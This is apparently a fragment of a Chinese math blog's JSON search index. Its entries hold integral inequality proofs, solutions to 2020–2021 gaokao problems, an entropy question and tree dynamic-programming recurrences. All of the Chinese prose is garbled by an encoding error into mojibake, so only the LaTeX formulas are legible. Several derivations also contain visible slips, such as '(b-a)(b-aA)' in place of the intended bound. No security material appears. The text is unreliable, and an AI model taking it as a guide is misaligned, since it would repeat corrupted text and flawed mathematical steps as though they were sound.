æ³•ä¸€ï¼šåŒ–ä¸ºäºŒé‡ç§¯åˆ† åˆ†æï¼š é¢˜ç›®ç»™äº†ä¸¤ä¸ªç§¯åˆ†ï¼Œæƒ³åˆ°æŠŠå¦ä¸€ä¸ªç§¯åˆ†å˜å…ƒä¸º$y$ï¼Œè½¬ä¸ºäºŒé‡ç§¯åˆ†ï¼Œè€ŒåŒºé—´$[a,b]$å˜ä¸ºçŸ©å½¢åŒºåŸŸï¼Œå¯ä»¥åˆ©ç”¨å…¶æ€§è´¨å˜ä¸ºäºŒé‡ç§¯åˆ†ã€‚æ ¹æ®å¯¹ç§°æ€§ï¼ŒäºŒé‡ç§¯åˆ†å¯ä»¥äº’æ¢å˜é‡ï¼Œæ„é€ $\\frac{1}{2}$ï¼Œå†ç”¨é‡è¦ä¸ç­‰å¼$e^x\\ge x+1$è¿›è¡Œæ”¾ç¼©ï¼Œæœ€åè¯å‡ºç­”æ¡ˆã€‚ $$I=\\int_{a}^{b}f(x)e^{f(x)}\\text{d}x\\int_{a}^{b}\\frac{1}{f(x)}\\text{d}x=\\int_{a}^{b}f(x)e^{f(x)}\\text{d}x\\int_{a}^{b}\\frac{1}{f(y)}\\text{d}y$$ $$\\because D: [a,b] Ã—[a,b]ä¸ºçŸ©å½¢åŒºåŸŸ$$ $$\\therefore I=\\iint\\limits_{D}^{}\\frac{f(x)}{f(y)}e^{f(x)}\\text{d}x\\text{d}y =\\iint\\limits_{D}^{}\\frac{f(y)}{f(x)}e^{f(y)}\\text{d}x\\text{d}y$$ $$\\therefore I=\\frac{1}{2}\\iint\\limits_{D}^{}\\frac{f(x)}{f(y)}e^{f(x)}\\text{d}x\\text{d}y +\\iint\\limits_{D}^{}\\frac{f(y)}{f(x)}e^{f(y)}\\text{d}x\\text{d}y$$ $$I=\\frac{1}{2}\\iint\\limits_{D}\\frac{f^2(x)e^{f(x)}+f^2(y)e^{f(y)}}{f(x)f(y)}\\text{d}x\\text{d}y \\ge \\iint\\limits_{D}\\sqrt{e^{f(x)+f(y)}}\\text{d}x\\text{d}y$$ $$I=\\iint\\limits_{D}e^{\\frac{f(x)+f(y)}{2}}\\text{d}x\\text{d}y \\ge \\iint\\limits_{D}(1+\\frac{f(x)+f(y)}{2})\\text{d}x\\text{d}y$$ $$I\\ge \\iint\\limits_{D}\\text{d}x\\text{d}y+\\iint\\limits_{D} f(x) \\text{d}x\\text{d}y=(b-a)^2+\\int_{a}^{b}f(x)\\text{d}x\\int_{a}^{b}\\text{d}y$$ $$I\\ge(b-a)^2+(b-a)A=(b-a)(b-aA)$$ æ³•äºŒï¼šæŸ¯è¥¿ä¸ç­‰å¼ åˆ†æï¼š çœ‹åˆ°ä¸¤ä¸ªç§¯åˆ†å¯ä»¥å‡‘æŸ¯è¥¿ä¸ç­‰å¼ï¼Œå†æ”¾ç¼©è¯å‡ºç­”æ¡ˆã€‚ $$\\because I= \\int_{a}^{b}f^2(x)\\text{d}x\\int_{a}^{b}g^2(x)\\text{d}x \\ge (\\int_{a}^{b}f(x)g(x)\\text{d}x)^2$$ $$\\therefore \\int_{a}^{b}f(x)e^{f(x)}\\text{d}x\\int_{a}^{b}\\frac{1}{f(x)}\\text{d}x \\ge (\\int_{a}^{b}\\sqrt{e^{f(x)}}\\text{d}x)^2$$ $$(\\int_{a}^{b}\\sqrt{e^{f(x)}}\\text{d}x)^2 = (\\int_{a}^{b} e^{\\frac{f(x)}{2}} \\text{d}x)^2 \\ge [\\int_{a}^{b}(1+\\frac{f(x)}{2})\\text{d}x]^2$$ $$\\int_{a}^{b}(1+\\frac{f(x)}{2})\\text{d}x=b-a+\\frac{A}{2}$$ $$\\therefore I\\ge (b-a+\\frac{A}{2})^2$$ $$å…ˆè¯: \\forall x,(\\frac{x}{2}+k)^2 \\ge k(k+x),kä¸ºå¸¸æ•°$$ $$\\Leftrightarrow \\frac{x^2}{4}+k^2+kx\\ge k^2+ kx$$ $$\\Leftrightarrow x^2\\ge0æ’æˆç«‹$$ $$\\therefore I \\ge (b-a)(b-a+A)$$ ","date":"2021-06-16","objectID":"/posts/math-%E9%AB%98%E6%95%B0%E7%AB%9E%E8%B5%9B%E7%AC%94%E8%AE%B0/:6:0","tags":["é«˜ç­‰æ•°å­¦"],"title":"é«˜æ•°ç«èµ›ç¬”è®°","uri":"/posts/math-%E9%AB%98%E6%95%B0%E7%AB%9E%E8%B5%9B%E7%AC%94%E8%AE%B0/"},{"categories":["æ•°å­¦"],"content":"é¢˜é¢: $å·²çŸ¥å‡½æ•°f(x)=x(1-\\ln{x})$ $(1)è®¨è®ºf(x)çš„å•è°ƒæ€§$ $(2)è®¾a,b\u003e0,a\\ne b,ä¸”b\\ln{a}-a\\ln{b}=a-b,è¯æ˜:2\u003c\\frac{1}{a}+\\frac{1}{b}\u003ce$ ","date":"2021-06-08","objectID":"/posts/math-2021%E6%96%B0%E9%AB%98%E8%80%83%E5%85%A8%E5%9B%BD%E5%8D%B7-22%E9%A2%98/:1:0","tags":["é«˜è€ƒæ•°å­¦"],"title":"2021æ–°é«˜è€ƒå…¨å›½â… å· 22é¢˜","uri":"/posts/math-2021%E6%96%B0%E9%AB%98%E8%80%83%E5%85%A8%E5%9B%BD%E5%8D%B7-22%E9%A2%98/"},{"categories":["æ•°å­¦"],"content":"é¢˜è§£: $(1)fâ€™(x)=-\\ln{x},åˆ™x\\in(0,1]æ—¶,f(x)å•è°ƒé€’å¢,x\\in[1,+\\infty)æ—¶,f(x)å•è°ƒé€’å‡$ $(2)$ $$\\because b\\ln{a}-a\\ln{b}=a-b$$ $$ä¸¤è¾¹åŒæ—¶é™¤ab$$ $$\\therefore \\frac{\\ln{a}}{a}-\\frac{\\ln{b}}{b}=\\frac{1}{b}-\\frac{1}{a}$$ $$\\therefore \\frac{\\ln{a}}{a}+\\frac{1}{a}=\\frac{\\ln{b}}{b}+\\frac{1}{b}$$ $$\\therefore \\frac{1}{a} ( 1+\\ln{a})=\\frac{1}{b} (1+ \\ln{b})$$ $$\\therefore \\frac{1}{a} ( 1-\\ln{\\frac{1}{a}})=\\frac{1}{b} ( 1-\\ln{\\frac{1}{b}})$$ $$ç”±(1)çŸ¥:0\u003c\\frac{1}{a}\u003c1\u003c\\frac{1}{b}\u003ce$$ $$ä»¤x_1=\\frac{1}{a},x_2=\\frac{1}{b}$$ $$å·¦è¾¹:x_1+x_2\u003e2$$ $$\\Leftrightarrow x_2\u003e2-x_1$$ $$\\Leftrightarrow f(x_2)=f(x_1)\u003cf(2-x_1)$$ $$\\Leftrightarrow f(2-x_1)-f(x_1)\u003e0$$ $$ä»¤g(x)=f(2-x)-f(x),x \u003e1$$ $$gâ€™(x)=\\ln{(2-x)}+\\ln{x}=\\ln{(2x-x^2)}\u003e0,g(x)å•è°ƒé€’å¢$$ $$\\because g(1)=0\\therefore g(x)\u003e0,åŸå¼æˆç«‹$$ $$å³è¾¹:x_1+x_2\u003ce$$ $$f(x)åœ¨(e,0)ç‚¹çš„åˆ‡çº¿ä¸ºy=e-x$$ $$åˆ‡çº¿æ”¾ç¼©:x(1-\\ln{x})\\le e-x$$ $$\\because x_1(1-\\ln{x_1})=x_2(1-\\ln{x_2})$$ $$\\therefore x_1(1-\\ln{x_1})\u003ce-x_2$$ $$\\Leftrightarrow x_1+x_2\u003ce+x_1\\ln{x_1}$$ $$\\because x_1 \\in (0,1)$$ $$\\therefore x_1\\ln{x_1}\u003c0$$ $$\\therefore x_1+x_2\u003ce+x_1\\ln{x_1}\\ \u003ce$$ $$\\therefore 2\u003cx_1+x_2\u003ce \\Leftrightarrow 2\u003c\\frac{1}{a}+\\frac{1}{b}\u003ce$$ ","date":"2021-06-08","objectID":"/posts/math-2021%E6%96%B0%E9%AB%98%E8%80%83%E5%85%A8%E5%9B%BD%E5%8D%B7-22%E9%A2%98/:2:0","tags":["é«˜è€ƒæ•°å­¦"],"title":"2021æ–°é«˜è€ƒå…¨å›½â… å· 22é¢˜","uri":"/posts/math-2021%E6%96%B0%E9%AB%98%E8%80%83%E5%85%A8%E5%9B%BD%E5%8D%B7-22%E9%A2%98/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æœ€å¤§ç‹¬ç«‹é›† é€‰å‡ºæœ€å¤šçš„ç‚¹,ä½¿å¾—æ‰€æœ‰ç‚¹éƒ½æ˜¯ä¸ç›¸é‚»çš„ çŠ¶æ€è¡¨ç¤ºï¼š $dp_{i,j}$ è¡¨ç¤ºä»¥ $i$ ä¸ºæ ¹çš„æ ‘ï¼Œå¦‚æœ $j$ ä¸º $0$ ï¼Œè¡¨ç¤ºä¸é€‰è¿™ä¸ªç‚¹ï¼Œå¦‚æœ $j$ ä¸º $1$ï¼Œè¡¨ç¤ºé€‰è¿™ä¸ªç‚¹ å±æ€§ï¼š $\\text{Max}$ çŠ¶æ€è®¡ç®—ï¼š å¦‚æœå½“å‰ç‚¹ $i$ ä¸é€‰ï¼Œé‚£ä¹ˆå­èŠ‚ç‚¹ $j$ å¯ä»¥è¢«é€‰æˆ–ä¸è¢«é€‰ï¼š $$dp_{i,0}=\\sum_{k=1}^{n}\\max (dp_{j_k,0},dp_{j_k,1})$$ å¦‚æœå½“å‰ç‚¹ $i$ è¢«é€‰ï¼Œé‚£ä¹ˆå­èŠ‚ç‚¹ $j$ ä¸€å®šä¸èƒ½è¢«é€‰ï¼š $$dp_{i,1}=\\sum_{k=1}^{n}dp_{j_k,0}$$ $\\text{AcWing}$ $285$ æ²¡æœ‰ä¸Šå¸çš„èˆä¼š(å¸¦ç‚¹æƒ) ","date":"2021-06-02","objectID":"/posts/cp%E6%9C%80%E5%A4%A7%E7%8B%AC%E7%AB%8B%E9%9B%86%E6%9C%80%E5%B0%8F%E7%82%B9%E8%A6%86%E7%9B%96%E6%9C%80%E5%B0%8F%E6%94%AF%E9%85%8D%E9%9B%86/:1:0","tags":["æ ‘å½¢ DP"],"title":"æœ€å¤§ç‹¬ç«‹é›†ã€æœ€å°ç‚¹è¦†ç›–ã€æœ€å°æ”¯é…é›†","uri":"/posts/cp%E6%9C%80%E5%A4%A7%E7%8B%AC%E7%AB%8B%E9%9B%86%E6%9C%80%E5%B0%8F%E7%82%B9%E8%A6%86%E7%9B%96%E6%9C%80%E5%B0%8F%E6%94%AF%E9%85%8D%E9%9B%86/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æœ€å°ç‚¹è¦†ç›– é€‰å‡ºæœ€å°‘çš„ç‚¹,è¦†ç›–æ‰€æœ‰çš„è¾¹ çŠ¶æ€è¡¨ç¤ºï¼š $dp_{i,j}$ è¡¨ç¤ºä»¥$i$ä¸ºæ ¹çš„æ ‘ï¼Œå¦‚æœ $j$ ä¸º $0$ ï¼Œè¡¨ç¤ºä¸é€‰è¿™ä¸ªç‚¹ï¼Œå¦‚æœ $j$ ä¸º $1$ ï¼Œè¡¨ç¤ºé€‰è¿™ä¸ªç‚¹ å±æ€§ï¼š$\\text{Min}$ çŠ¶æ€è®¡ç®—ï¼š å¦‚æœå½“å‰ç‚¹ $i$ ä¸é€‰ï¼Œé‚£ä¹ˆå­èŠ‚ç‚¹ $j$ ä¸€å®šè¢«é€‰ï¼š $$dp_{i,0}=\\sum_{k=1}^{n} dp_{j_k,1}$$ å¦‚æœå½“å‰ç‚¹ $i$ è¢«é€‰ï¼Œé‚£ä¹ˆå­èŠ‚ç‚¹ $j$ å¯ä»¥è¢«é€‰æˆ–è€…ä¸é€‰ï¼š $$dp_{i,1}=\\sum_{k=1}^{n} \\min (dp_{j_k,0},dp_{j_k,1})$$ $\\text{AcWing}$ $323$ æˆ˜ç•¥æ¸¸æˆ(å¸¦ç‚¹æƒ) ","date":"2021-06-02","objectID":"/posts/cp%E6%9C%80%E5%A4%A7%E7%8B%AC%E7%AB%8B%E9%9B%86%E6%9C%80%E5%B0%8F%E7%82%B9%E8%A6%86%E7%9B%96%E6%9C%80%E5%B0%8F%E6%94%AF%E9%85%8D%E9%9B%86/:2:0","tags":["æ ‘å½¢ DP"],"title":"æœ€å¤§ç‹¬ç«‹é›†ã€æœ€å°ç‚¹è¦†ç›–ã€æœ€å°æ”¯é…é›†","uri":"/posts/cp%E6%9C%80%E5%A4%A7%E7%8B%AC%E7%AB%8B%E9%9B%86%E6%9C%80%E5%B0%8F%E7%82%B9%E8%A6%86%E7%9B%96%E6%9C%80%E5%B0%8F%E6%94%AF%E9%85%8D%E9%9B%86/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"æœ€å°æ”¯é…é›† é€‰å‡ºæœ€å°‘çš„ç‚¹,ä½¿å¾—æ¯ä¸ªç‚¹è¦ä¹ˆè¢«é€‰ã€è¦ä¹ˆè¢«å®ƒçš„ç›¸é‚»ç‚¹æ”¯é… çŠ¶æ€è¡¨ç¤ºï¼š $dp_{i,j}$ è¡¨ç¤ºä»¥$i$ä¸ºæ ¹çš„æ ‘ï¼Œå¦‚æœ $j$ ä¸º $0$ï¼Œè¡¨ç¤ºåœ¨ç‚¹ $i$ä¸è¢«æ”¯é…ï¼Œä¸”å°†è¦è¢«çˆ¶èŠ‚ç‚¹æ”¯é…ï¼Œå¦‚æœ $j$ ä¸º $1$ï¼Œè¡¨ç¤ºåœ¨ç‚¹ $i$ ä¸è¢«æ”¯é…ï¼Œä¸”å°†è¦è¢«å­èŠ‚ç‚¹æ”¯é…ï¼Œå¦‚æœ $j$ ä¸º $2$ï¼Œè¡¨ç¤ºåœ¨ç‚¹ $i$ æ”¯é… å±æ€§ï¼š$\\text{Min}$ çŠ¶æ€è®¡ç®—ï¼š å¦‚æœå½“å‰ç‚¹ $i$ è¦è¢«çˆ¶èŠ‚ç‚¹æ”¯é…ï¼Œé‚£ä¹ˆå¯ä»¥é€‰æ‹©å­èŠ‚ç‚¹æˆ–è€…é€‰æ‹©è¯¥èŠ‚ç‚¹ï¼š $$dp_{i,0}=\\sum_{k=1}^{n}\\min(dp_{j_k,1},dp_{j_k,2})$$ å¦‚æœå½“å‰çš„ç‚¹ $i$ è¦è¢«å­èŠ‚ç‚¹æ”¯é…ï¼Œé‚£ä¹ˆå°±è¦æšä¸¾æ˜¯å“ªä¸ªå­èŠ‚ç‚¹ $j$ è¢«é€‰çš„æ–¹æ¡ˆæœ€å°($u_k$ ä»£è¡¨å­èŠ‚ç‚¹çš„ç¬¬ $k$ ä¸ªå­èŠ‚ç‚¹)ï¼š $$dp_{i,1}= \\min( dp_{i,1},dp_{j_k,2}+dp_{i,0}-\\sum_{k=1}^{n}\\min (dp_{u_k,1},dp_{u_k,2}))$$ å¦‚æœé€‰å½“å‰çš„ç‚¹ $i$ï¼Œé‚£ä¹ˆå­èŠ‚ç‚¹ $j$ è¢« $i$ æ”¯é…ï¼Œæˆ–è€…é€‰æ‹©å­èŠ‚ç‚¹ $j$ï¼Œæˆ–è€…å­èŠ‚ç‚¹ $j$ è¢«å­èŠ‚ç‚¹çš„å­èŠ‚ç‚¹ $u$ æ”¯é…ï¼š $$dp_{i,2}=\\sum_{k=1}^{n}\\min(dp_{j_k,0},dp_{j_k,1},dp_{j_k,2})$$ $\\text{SDUT}$ $4831$ æ ‘çš„æŸ“è‰² $\\text{AcWing}$ $1077$ çš‡å®«çœ‹å®ˆ(å¸¦ç‚¹æƒ) å‚è€ƒï¼š AcWingç®—æ³•æé«˜è¯¾ æ ‘ä¸Šdpçš„ä¸€äº›æ€»ç»“ æ²¡æœ‰ä¸Šå¸çš„èˆä¼šé¢˜è§£(å°å‘†å‘†) æˆ˜ç•¥æ¸¸æˆé¢˜è§£(å°å‘†å‘†) çš‡å®«çœ‹å®ˆé¢˜è§£(å°å‘†å‘†) $\\text{SDUT}$ $4831$ æ ‘çš„æŸ“è‰²é¢˜è§£(lxw) ","date":"2021-06-02","objectID":"/posts/cp%E6%9C%80%E5%A4%A7%E7%8B%AC%E7%AB%8B%E9%9B%86%E6%9C%80%E5%B0%8F%E7%82%B9%E8%A6%86%E7%9B%96%E6%9C%80%E5%B0%8F%E6%94%AF%E9%85%8D%E9%9B%86/:3:0","tags":["æ ‘å½¢ DP"],"title":"æœ€å¤§ç‹¬ç«‹é›†ã€æœ€å°ç‚¹è¦†ç›–ã€æœ€å°æ”¯é…é›†","uri":"/posts/cp%E6%9C%80%E5%A4%A7%E7%8B%AC%E7%AB%8B%E9%9B%86%E6%9C%80%E5%B0%8F%E7%82%B9%E8%A6%86%E7%9B%96%E6%9C%80%E5%B0%8F%E6%94%AF%E9%85%8D%E9%9B%86/"},{"categories":["æ•°å­¦"],"content":" A é€‰é¡¹ï¼š $n=1$ æ—¶ï¼Œ $p_1=1$ï¼Œ$âˆ´ H(X)=âˆ’p_1\\log_2p_1=0$ï¼Œæ­£ç¡®ã€‚ B é€‰é¡¹ï¼š $n=2$ æ—¶ï¼Œ $p_1+p_2=1$ï¼Œ$H(X)=-(p_{1}\\log_{2}p_{1}+p_{2}\\log_{2}p_{2})=-[p_{1}\\log_{2}p_{1}+(1-p_{1})\\log_{2}(1-p_{1})]$ æˆ‘ä»¬ä»¤ $f(x)=-x\\log_{2}x-(1-x)\\log_{2}(1-x)$ åˆ™ $f'(x)=\\log_{2}\\frac{1-x}{x}$ï¼Œæ˜“è¯ $f'(x)$ åœ¨ $x\\in(0,\\frac{1}{2})$ å•è°ƒé€’å¢ï¼Œåœ¨ $x\\in(\\frac{1}{2},1)$ å•è°ƒé€’å‡ï¼Œé”™è¯¯ã€‚ C é€‰é¡¹ï¼š$H(X)=(-\\dfrac{1}{n}\\log_{2}\\dfrac{1}{n})\\cdot n=\\log_{2}n$ï¼Œå•è°ƒé€’å¢ï¼Œæ­£ç¡®ã€‚ D é€‰é¡¹ï¼š$H(Y)=-\\sum_{j=1}^{m}({p_{j}+p_{2m+1-j}})\\log_{2}(p_{j}+p_{2m+1-j})$ï¼Œ$H(X)=-\\sum_{i=1}^{2m}{p_{i}\\log_{2}p_{i}}$ å³è¯ï¼š$({p_{i}+p_{2m+1-i}})\\log_{2}(p_{i}+p_{2m+1-i}) \\le p_{i}\\log_{2}p_{i} + p_{2m + 1 - i}\\log_{2}p_{2m + 1 - i}$ é€é¡¹æ¯”è¾ƒï¼š$p_{i}\\log_{2}(p_{i}+p_{2m+1-i}) \\le p_{i}\\log_{2}p_{i}$ $p_{2m + 1 - i}\\log_{2}(p_{i} + p_{2m+1-i}) \\le p_{2m + 1 - i}\\log_{2}p_{2m + 1 - i}$ å› ä¸º $p_i, p_{2m+ 1 - i} \u003e 0$ï¼Œæ‰€ä»¥ç­‰å¼ä¸æˆç«‹ï¼Œé”™è¯¯ã€‚ ç­”æ¡ˆä¸ºï¼šAC ","date":"2020-07-15","objectID":"/posts/math-2020%E5%B9%B4%E9%AB%98%E8%80%83%E6%95%B0%E5%AD%A612%E9%A2%98/:0:0","tags":["é«˜è€ƒæ•°å­¦"],"title":"2020å¹´æ™®é€šé«˜ç­‰å­¦æ ¡æ‹›ç”Ÿå…¨å›½ç»Ÿä¸€è€ƒè¯•ï¼ˆæ–°é«˜è€ƒå…¨å›½â… å·ï¼‰æ•°å­¦12é¢˜","uri":"/posts/math-2020%E5%B9%B4%E9%AB%98%E8%80%83%E6%95%B0%E5%AD%A612%E9%A2%98/"},{"categories":["æ•°å­¦"],"content":"21.ï¼ˆ12åˆ†ï¼‰ å·²çŸ¥å‡½æ•° $f(x)=ae^{x-1}-\\ln x+\\ln a$ (1) å½“ $a = e$ æ—¶ï¼Œæ±‚æ›²çº¿ $y=f(x)$ åœ¨ç‚¹ $(1,f(1))$ å¤„çš„åˆ‡çº¿ä¸ä¸¤ä¸ªåæ ‡è½´å›´æˆçš„ä¸‰è§’å½¢çš„é¢ç§¯ã€‚ (2) è‹¥ $f(x)\\geq1$ ï¼Œæ±‚ $a$ çš„å–å€¼èŒƒå›´ã€‚ è¿™é‡Œé‡ç‚¹è§£ä¸€ä¸‹ç¬¬äºŒé—®ã€‚ åŒæ„æ³•ï¼š$ae^{x-1}-\\ln x+\\ln a \\geq 1 \\Leftrightarrow ae^{x-1} \\geq \\ln\\dfrac{ex}{a}$ è§‚å¯Ÿåˆ°å·¦è¾¹æœ‰ $x-1$ æ¬¡æ–¹ï¼Œå³è¾¹ä¸º $ex$ï¼Œæ‰€ä»¥ä¸¤è¾¹åŒä¹˜ $ex$ $axe^{x}\\geq ex \\ln\\dfrac{ex}{a}$ æ­¤æ—¶å½¢åŠ¿å·²ç»å¾ˆæ˜äº†ï¼Œæ˜¯ $xe^x$ å½¢å¼çš„åŒæ„ï¼š $f(x)e^{f(x)} \\ge g(x)e^{g(x)} $ å½“ $a\u003e0$ æ—¶ï¼Œ $xe^{x}\\geq \\dfrac{ex}{a}\\ln\\dfrac{ex}{a} \\Leftrightarrow xe^{x}\\geq \\ln\\dfrac{ex}{a}e^{\\ln\\frac{ex}{a}}$ âˆ´åªéœ€è¯ $x\\geq \\ln\\dfrac{ex}{a}$ ï¼Œæ•´ç†å¾— $ae^{x}\\geq ex$ï¼Œæ˜¾ç„¶æ˜¯ $e^{x}\\geq ex$ çš„æ”¾ç¼©ã€‚æ•…è€Œ $aâ‰¥1 $ å½“ $a\u003c0$ æ—¶ï¼Œ$xe^{x}\\leq \\dfrac{ex}{a}\\ln\\dfrac{ex}{a} \\Leftrightarrow xe^{x}\\leq \\ln\\dfrac{ex}{a}e^{\\ln\\frac{ex}{a}}$ æ‰€ä»¥åªéœ€è¯ $x\\leq \\ln\\dfrac{ex}{a}$ï¼Œæ•´ç†å¾— $ae^{x}\\geq ex$ï¼Œä¸ $a\u003e0$ æƒ…å†µç›¸åŒã€‚ ç»¼ä¸Š $a\\in[1,\\infty)$ ","date":"2020-07-15","objectID":"/posts/math-2020%E5%B9%B4%E9%AB%98%E8%80%83%E6%95%B0%E5%AD%A621%E9%A2%98/:0:0","tags":["é«˜è€ƒæ•°å­¦"],"title":"2020å¹´æ™®é€šé«˜ç­‰å­¦æ ¡æ‹›ç”Ÿå…¨å›½ç»Ÿä¸€è€ƒè¯•ï¼ˆæ–°é«˜è€ƒå…¨å›½â… å·ï¼‰æ•°å­¦21é¢˜","uri":"/posts/math-2020%E5%B9%B4%E9%AB%98%E8%80%83%E6%95%B0%E5%AD%A621%E9%A2%98/"},{"categories":["æ•°å­¦"],"content":" åˆ†æï¼š $(1)$ $g'(x)=\\dfrac{Ï€^{x}}{x^{Ï€}}(\\lnÏ€-\\frac{Ï€}{x})$ $âˆ´g'(1)=Ï€(\\lnÏ€-Ï€)$ $(2)$ $f(x)=\\int x \\text{d} \\frac{Ï€^{x}}{\\lnÏ€} = \\dfrac{xÏ€^{x}}{\\lnÏ€}-\\int \\dfrac{Ï€^{x}}{\\lnÏ€}\\text{d}x = \\dfrac{xÏ€^{x}}{\\lnÏ€}-\\dfrac{Ï€^{x}}{\\ln ^ 2Ï€}$ $âˆ´h(x)=\\dfrac{x}{\\lnÏ€}-\\dfrac{1}{\\ln^2Ï€}-\\dfrac{1}{x^{Ï€}}$ $âˆ´h(1)=\\dfrac{1}{\\lnÏ€}-\\dfrac{1}{\\ln^2Ï€}-1$ ä»¤ $t=\\dfrac{1}{\\lnÏ€}\\in(0,1)$ï¼Œ$h(1)=t-t^{2}-1\\leq-\\frac{3}{4}\u003c0$ $h(Ï€)+\\dfrac{1}{Ï€^Ï€}=\\dfrac{Ï€}{\\lnÏ€}-\\dfrac{1}{\\ln^2Ï€}=\\dfrac{Ï€\\lnÏ€-1}{\\ln^2Ï€}$ ä»¤ $u=\\lnÏ€ \\in (1,2)$ï¼Œ$h(Ï€)+\\dfrac{1}{Ï€^Ï€}=\\dfrac{ue^u-1}{u^2} = \\varphi(u)$ $\\varphiâ€™(u)=\\dfrac{(u^2-u)e^{u}+2}{u^{3}}$ï¼Œä»¤ $\\phi(u)=(u^2-u)e^{u}+2, \\phiâ€™(u)=(u^2+u-1)e^u$ æ˜“è¯ $\\phiâ€™(u)\u003e0\\ (u\\in(1,2))$ï¼Œ$âˆ´\\varphiâ€™(u)\u003e0$ï¼Œ$\\varphi(u)$ åœ¨ $u\\in(1,2)$ å•è°ƒé€’å¢ã€‚ $\\varphi(1)=e-1\u003e0,\\varphi(2)=\\dfrac{2e^2-1}{4}\u003e0,âˆ´h(Ï€)+\\dfrac{1}{Ï€^Ï€}\u003e0$ $âˆ´h(1)Â·[h(Ï€)+\\dfrac{1}{Ï€^Ï€}]\u003c0$ å¾—è¯ã€‚ ","date":"2020-03-14","objectID":"/posts/math-pi%E8%8A%82/:0:0","tags":["é«˜è€ƒæ•°å­¦"],"title":"ä»Šå¤©Ï€èŠ‚ï¼Œå‡ºäº†ä¸€é“é¢˜ï¼Œé«˜ä¸­ç”Ÿ å¤§ä½¬å‹¿å–·","uri":"/posts/math-pi%E8%8A%82/"}]